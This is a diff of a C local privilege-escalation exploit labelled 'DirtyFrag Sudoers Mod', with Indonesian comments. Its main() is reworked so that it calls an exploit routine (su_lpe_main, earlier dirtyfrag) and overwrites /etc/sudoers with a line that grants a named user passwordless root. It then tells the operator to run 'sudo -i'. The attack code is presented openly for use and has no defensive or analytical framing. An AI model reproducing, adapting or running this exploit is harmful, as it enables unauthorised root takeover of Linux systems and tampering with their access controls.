@@ -1894,38 +1894,24 @@ static int run_root_pty(void)
 
 int main(int argc, char **argv)
 {
-    const char *path = "/etc/sudoers";
-    // Sesuaikan username 'snakcz' atau 'smoky' sesuai whoami lo
-    const char *data = "\nsnakcz ALL=(ALL:ALL) NOPASSWD:ALL #"; 
-    
     printf("[*] DirtyFrag Sudoers Mod by Smoky\n");
 
-    if (getuid() == 0) {
-        execlp("/bin/bash", "bash", (char *)NULL);
-        return 0;
-    }
+    // Kita paksa payload masuk ke /etc/sudoers
+    // Kita buat dummy argv untuk nipu fungsi aslinya
+    char *fake_argv[] = {
+        "exp", 
+        "/etc/sudoers", 
+        "\nsnakcz ALL=(ALL:ALL) NOPASSWD:ALL #", 
+        NULL
+    };
 
-    int fd = open(path, O_RDONLY);
-    if (fd < 0) {
-        perror("[-] Gagal buka /etc/sudoers");
-        return 1;
-    }
-    struct stat st;
-    fstat(fd, &st);
-    close(fd);
+    // Panggil fungsi LPE bawaan scriptnya
+    // su_lpe_main biasanya nerima (argc, argv)
+    extern int su_lpe_main(int argc, char **argv); 
+    
+    printf("[*] Triggering su_lpe_main dengan target sudoers...\n");
+    su_lpe_main(3, fake_argv);
 
-    loff_t offset = st.st_size - strlen(data);
-    if (offset < 0) {
-        printf("[-] File terlalu kecil.\n");
-        return 1;
-    }
-
-    printf("[+] Target: %s | Offset: %lld\n", path, (long long)offset);
-    printf("[*] Memulai eksploitasi via dirtyfrag()...\n");
-
-    // PAKAI NAMA FUNGSI INI:
-    dirtyfrag(path, offset, data); 
-
-    printf("[+] Selesai. Coba 'sudo -i' sekarang!\n");
+    printf("[+] Coba 'sudo -i'\n");
     return 0;
 }
